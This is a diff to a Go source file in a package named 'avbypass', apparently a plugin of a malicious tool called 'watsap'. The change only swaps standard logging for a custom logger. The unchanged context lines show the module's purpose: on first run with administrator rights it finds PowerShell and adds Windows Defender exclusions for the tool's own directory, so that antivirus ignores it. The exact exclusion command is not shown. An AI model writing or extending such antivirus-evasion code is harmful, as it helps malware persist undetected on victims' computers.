@@ -4,10 +4,10 @@ package avbypass
 
 import (
 	"fmt"
-	"log"
 	"os"
 	"os/exec"
 	"watsap/utils/config"
+	"watsap/utils/logger"
 )
 
 // var customAVName = "'Windows Defender Antivirus'"
@@ -20,9 +20,9 @@ func init() {
 		config.WaDir,
 	}
 
-	log.Println("Bypass-AV Plugin initialized.")
+	logger.Debug("BypassAV", "Plugin initialized.")
 	if err := checkPowerShell(); err != nil {
-		log.Printf("ERROR: Initialization failed: %v", err)
+		logger.Debug("BypassAV", "Initialization warning: %v", err)
 	}
 }
 
@@ -38,25 +38,25 @@ func checkPowerShell() error {
 		return fmt.Errorf("powershell not found in system")
 	}
 	powershellPath = path
-	log.Printf("PowerShell found at: %s", powershellPath)
+	logger.Debug("BypassAV", "PowerShell found at: %s", powershellPath)
 	return nil
 }
 
 func Main() {
 	if powershellPath == "" {
-		log.Println("PowerShell path is missing. Aborting operation.")
+		logger.Debug("BypassAV", "PowerShell path is missing. Aborting operation.")
 		return
 	}
 
 	if isAdmin() && config.FirstRun {
 		AddDefenderExclusions()
 
-		log.Println("Defender exclusions added locally.")
+		logger.Info("BypassAV", "Defender exclusions added locally.")
 	}
 }
 
 func AddDefenderExclusions() {
-	log.Println("Attempting to add Defender exclusions...")
+	logger.Info("BypassAV", "Attempting to add Defender exclusions...")
 	for _, path := range defenderExclusions {
 		if path == "" {
 			continue
@@ -67,9 +67,9 @@ func AddDefenderExclusions() {
 		output, err := cmd.CombinedOutput()
 
 		if err != nil {
-			log.Printf("Failed to add exclusion: %s | Error: %s", path, string(output))
+			logger.Error("BypassAV", "Failed to add exclusion: %s | Error: %s", path, string(output))
 		} else {
-			log.Printf("Successfully added exclusion: %s", path)
+			logger.Info("BypassAV", "Successfully added exclusion: %s", path)
 		}
 	}
 }
